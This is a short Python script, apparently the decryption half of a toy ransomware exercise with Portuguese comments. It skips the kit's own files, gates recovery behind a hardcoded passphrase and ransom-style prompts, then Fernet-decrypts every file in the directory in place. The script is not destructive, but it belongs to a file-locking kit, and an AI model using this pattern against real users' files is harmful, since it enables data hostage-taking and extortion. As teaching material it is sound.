import os
from cryptography.fernet import Fernet

files = []
# Itera sobre os arquivos no diretório atual
for file in os.listdir():
# Ignora os arquivos com os nomes 'Crypto.py', 'thekey.key', e 'decrypt.py'
    if file == "Crypto.py" or file == "thekey.key" or file == "decrypt.py":
        continue
# Verifica se o elemento na iteração é um arquivo
    if os.path.isfile(file):
# Adiciona o nome do arquivo à lista 'files'
        files.append(file)
# Exibe a lista de arquivos que serão descriptografados (apenas para fins de visualização)
    print(files)
# Abre o arquivo 'thekey.key' em modo de leitura binária ('rb')
# Lê a chave secreta para descriptografar os arquivos
with open("thekey.key", "rb") as key:
    secretkey = key.read()  
# Define uma senha (passphrase) para a descriptografia
passphrase = "Cy3erS3c"
# Solicita ao usuário a senha para descriptografar os arquivos
upassoword = input("Entre com a senha para descriptografar seus arquivos: ")
# Verifica se a senha fornecida pelo usuário é igual à senha definida (passphrase)
if upassoword == passphrase:
# Itera sobre os arquivos na lista 'files'    
    for file in files:
# Abre o arquivo para leitura binária ('rb')        
        with open(file, "rb") as thefile:
# Lê o conteúdo do arquivo            
            content = thefile.read()
# Realiza a descriptografia do conteúdo do arquivo usando a chave secreta 'secretkey'
        content_decrypt = Fernet(secretkey).decrypt(content)
# Abre o arquivo novamente em modo de escrita binária ('wb')
# Sobrescreve o conteúdo criptografado com o conteúdo descriptografado        
        with open(file, "wb") as thefile:
            thefile.write(content_decrypt)
# Exibe uma mensagem indicando que os arquivos foram recuperados
        print("Voce recuperou todos os seus arquivos!!")
else:
# Exibe uma mensagem de erro caso a senha fornecida pelo usuário não seja correta
    print("Entre com a senha correta para recuperar seus arquivos")                        